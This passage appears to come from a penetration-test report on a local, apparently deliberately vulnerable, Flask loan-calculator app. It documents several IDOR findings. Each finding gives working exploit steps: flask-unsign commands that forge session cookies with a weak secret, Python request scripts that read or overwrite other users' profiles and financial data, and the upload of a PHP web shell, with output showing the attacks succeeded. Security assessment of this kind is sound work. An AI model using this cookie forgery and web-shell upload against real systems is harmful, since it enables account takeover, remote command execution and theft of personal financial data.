- **Impact:** Complete unauthorized modification of victim's profile data and potential account takeover. Attacker can change victim's email to gain control of password reset flows, modify loan amounts to cause financial discrepancies, and corrupt user data integrity.
- **Severity:** Critical

**Prerequisites:**
1. Knowledge of the weak Flask secret key: `'your_secret_key'`
2. flask-unsign tool for session forgery
3. Target victim's user_id value
4. Network access to http://localhost:42029/

**Exploitation Steps:**

1. **Forge session cookie for victim (user_id=2):**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 2}" --secret 'your_secret_key'
   ```
   Output: `eyJ1c2VyX2lkIjoyfQ.aQUHQQ.R0q9iai2tmgrvP1P569QRx-6xxx`

2. **Verify victim's current profile data (optional):**
   Check database or use AUTHZ-VULN-01 to read current values:
   ```
   BEFORE: name=Alice, lastname=Victim, email=alice@victim.com, loan_amount=50000
   ```

3. **Send malicious POST request with attacker-controlled data:**
   ```python
   import requests

   forged_session = "eyJ1c2VyX2lkIjoyfQ.aQUHQQ.R0q9iai2tmgrvP1P569QRx-6xxx"

   attack_data = {
       'name': 'COMPROMISED',
       'lastname': 'ACCOUNT',
       'email': 'attacker@evil.com',
       'loan_amount': '1000000.0',
       'loan_term_months': '999',
       'monthly_payment': '1.0'
   }

   response = requests.post(
       "http://localhost:42029/profile",
       data=attack_data,
       cookies={"session": forged_session}
   )
   ```

4. **Verify modification success:**
   Application redirects to /home (status 302/200), and database shows modified values:
   ```
   AFTER: name=COMPROMISED, lastname=ACCOUNT, email=attacker@evil.com, loan_amount=1000000
   ```

**Proof of Impact:**

Successfully modified victim's profile:
```
POST Status: 200 OK

Database verification:
BEFORE ATTACK:
  name        lastname    email                 loan_amount
  Alice       Victim      alice@victim.com      50000

AFTER ATTACK:
  name        lastname    email                 loan_amount
  COMPROMISED ACCOUNT     attacker@evil.com     1000000

✓ Victim's email changed to attacker-controlled address
✓ All profile fields successfully modified
✓ Account takeover achievable via password reset to new email
```

**Notes:**
- This vulnerability enables complete account takeover by changing the victim's email
- No CSRF protection exists, making this exploitable via cross-site attacks
- No rate limiting or anomaly detection on profile modifications
- Database commits happen immediately with no validation or approval workflow

---

### AUTHZ-VULN-03: Horizontal IDOR - Profile Modification + Malicious File Upload via Session Forgery

**Summary:**
- **Vulnerable location:** POST /update_profile endpoint at `/app/website/app/routes.py:84-119`
- **Overview:** An attacker can forge session cookies to both modify any user's profile data AND upload arbitrary files to the victim's account. This is the most severe write vulnerability, combining data modification with unrestricted file upload capabilities.
- **Impact:** Complete profile takeover plus ability to upload malicious files (backdoors, web shells, malware) to the victim's account. Files are stored in the web-accessible directory `/var/www/loan_calculator/app/static/images/` and associated with the victim's profile, enabling content injection, stored XSS, or RCE attacks.
- **Severity:** Critical

**Prerequisites:**
1. Knowledge of the weak Flask secret key: `'your_secret_key'`
2. flask-unsign tool for session forgery
3. Target victim's user_id value
4. Network access to http://localhost:42029/
5. Malicious file to upload (e.g., PHP backdoor, HTML with XSS payload)

**Exploitation Steps:**

1. **Create malicious file payload:**
   ```bash
   # Example: PHP web shell
   echo '<?php system($_GET["cmd"]); ?>' > backdoor.php
   ```

2. **Forge session cookie for victim (user_id=2):**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 2}" --secret 'your_secret_key'
   ```

3. **Prepare multipart form data with file and profile fields:**
   ```python
   import requests

   forged_session = "eyJ1c2VyX2lkIjoyfQ.aQUHNA.Nd5Ch9UZFAJ5eVtnZ2uNI0Aixx"

   # File to upload
   files = {
       'image_profile': ('attacker_backdoor.php',
                        b'<?php system($_GET["cmd"]); ?>',
                        'application/x-php')
   }

   # Profile data to modify
   data = {
       'name': 'PWNED',
       'lastname': 'VICTIM',
       'email': 'hacked@attacker.com',
       'loan_amount': '999999.0',
       'loan_term_months': '1',
       'monthly_payment': '0.01'
   }

   response = requests.post(
       "http://localhost:42029/update_profile",
       data=data,
       files=files,
       cookies={"session": forged_session}
   )
   ```

4. **Verify file upload and profile modification:**
   - Check database for modified profile fields
   - Verify file exists in `/var/www/loan_calculator/app/static/images/`
   - File is accessible via URL: `http://localhost:42029/static/images/attacker_backdoor.php`

**Proof of Impact:**

Successfully modified profile and uploaded malicious file:
```
POST Status: 200 OK

Database verification:
BEFORE ATTACK:
  name     email                image_profile_filename
  Alice    alice@victim.com     default_profile.png

AFTER ATTACK:
  name     email                image_profile_filename
  PWNED    hacked@attacker.com  attacker_backdoor.php

File system verification:
Files in /var/www/loan_calculator/app/static/images/:
  -rw-r--r-- www-data www-data 30 Oct 31 19:00 attacker_backdoor.php

File contents: <?php system($_GET["cmd"]); ?>

✓ Profile successfully modified
✓ Malicious PHP backdoor uploaded to victim's account
✓ File is web-accessible and executable (if PHP is enabled)
✓ Victim's account now associated with attacker's malicious content
```

**Notes:**
- Most severe authorization vulnerability in the application
- Combines profile modification (AUTHZ-VULN-02) with unrestricted file upload
- No file type validation, MIME type checking, or content scanning
- While path traversal protection exists, it doesn't prevent authorization bypass
- Files are stored with attacker-controlled filenames (with minor sanitization)
- No file size limits or upload rate limiting
- Enables stored XSS, RCE (if server processes uploaded files), content injection, malware distribution

---

### AUTHZ-VULN-04: Horizontal IDOR - Unauthorized Home Page Access via Session Forgery

**Summary:**
- **Vulnerable location:** GET /home endpoint at `/app/website/app/routes.py:48-57`
- **Overview:** An attacker can forge session cookies to access any user's home page and view their name and lastname displayed in the welcome message.
- **Impact:** Unauthorized access to victim's PII (name and lastname). While less severe than full profile access (AUTHZ-VULN-01), this still constitutes a privacy violation and demonstrates the systemic authorization failure across all authenticated endpoints.
- **Severity:** High

**Prerequisites:**
1. Knowledge of the weak Flask secret key: `'your_secret_key'`
2. flask-unsign tool for session forgery
3. Target victim's user_id value
4. Network access to http://localhost:42029/

**Exploitation Steps:**

1. **Forge session cookie for victim (user_id=2):**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 2}" --secret 'your_secret_key'
   ```

2. **Send GET request to /home endpoint:**
   ```python
   import requests

   forged_session = "eyJ1c2VyX2lkIjoyfQ.aQUHNA.Nd5Ch9UZFAJ5eVtnZ2uNI0Aixx"

   response = requests.get(
       "http://localhost:42029/home",
       cookies={"session": forged_session}
   )
   ```

3. **Extract victim's name from HTML response:**
   The victim's name and lastname appear in the home page content:
   ```html
   Welcome, Alice Victim!
   ```

**Proof of Impact:**

Successfully accessed victim's home page:
```
GET Status: 200 OK
Response Size: 1592 bytes

Victim's PII found in response:
  ✓ Contains 'Alice': True
  ✓ Contains 'Victim': True

HTML content shows victim's full name displayed to attacker
```

**Notes:**
- Lower impact than AUTHZ-VULN-01 (only exposes name/lastname vs complete profile)
- Demonstrates same authorization bypass pattern across all endpoints
- No ownership validation at routes.py:51-53
- Confirms systemic failure in authorization model

---

### AUTHZ-VULN-05: Horizontal IDOR - Unauthorized Financial Data Access via Session Forgery

**Summary:**
- **Vulnerable location:** GET /loan_details endpoint at `/app/website/app/routes.py:136-146`
- **Overview:** An attacker can forge session cookies to access any user's sensitive financial loan information, including loan principal amount, loan term duration, and monthly payment amounts.
- **Impact:** Complete exposure of victim's sensitive financial PII. This data can be used for identity theft, social engineering, financial fraud, and may violate financial data protection regulations (GLBA, PCI-DSS). Enables targeted phishing attacks with knowledge of victim's actual financial situation.
- **Severity:** Critical

**Prerequisites:**
1. Knowledge of the weak Flask secret key: `'your_secret_key'`
2. flask-unsign tool for session forgery
3. Target victim's user_id value
4. Network access to http://localhost:42029/

**Exploitation Steps:**

1. **Forge session cookie for victim (user_id=2):**
   ```bash
   flask-unsign --sign --cookie "{'user_id': 2}" --secret 'your_secret_key'
   ```
   Output: `eyJ1c2VyX2lkIjoyfQ.aQUHmw.lU9R4EaRO96k0dJVx4CEKyx_BW4`

2. **Send GET request to /loan_details endpoint:**
   ```python
   import requests

   forged_session = "eyJ1c2VyX2lkIjoyfQ.aQUHmw.lU9R4EaRO96k0dJVx4CEKyx_BW4"

   response = requests.get(
       "http://localhost:42029/loan_details",
       cookies={"session": forged_session}
   )
   ```

3. **Extract victim's financial data from HTML response:**
   The loan details page displays:
   - Loan Amount (principal): `$75,000.00`
   - Loan Term: `180 months`
   - Monthly Payment: `$833.33`

**Proof of Impact:**

Successfully accessed victim's sensitive financial data:
```
GET Status: 200 OK
Response Size: 3773 bytes

Database shows victim's actual financial data:
  id: 2
  username: victim
  loan_amount: 75000
  loan_term_months: 180
  monthly_payment: 833.33

Response verification:
  ✓ Victim's loan amount (75000) visible: True
  ✓ Victim's monthly payment (833.33) visible: True
  ✓ Victim's loan term (180 months) visible: True

Complete financial profile exposed to unauthorized attacker.
```

**Notes:**
- High-value target due to sensitive financial data exposure
- May violate financial data protection regulations (GLBA, PCI-DSS)
- Enables targeted financial fraud and social engineering attacks
- No ownership validation at routes.py:139-141
- Financial data should be considered highly sensitive PII
- Exposure enables identity theft and sophisticated phishing campaigns

---
